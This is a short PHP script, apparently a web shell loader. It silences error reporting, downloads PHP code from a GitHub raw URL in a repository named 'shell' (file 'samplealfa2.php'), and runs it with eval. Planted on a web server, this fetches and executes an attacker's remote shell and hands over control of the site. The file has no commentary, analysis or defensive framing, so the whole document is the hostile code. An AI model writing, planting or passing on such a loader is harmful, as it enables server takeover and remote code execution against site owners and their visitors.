<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/mangoleh098/shell/refs/heads/main/samplealfa2.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
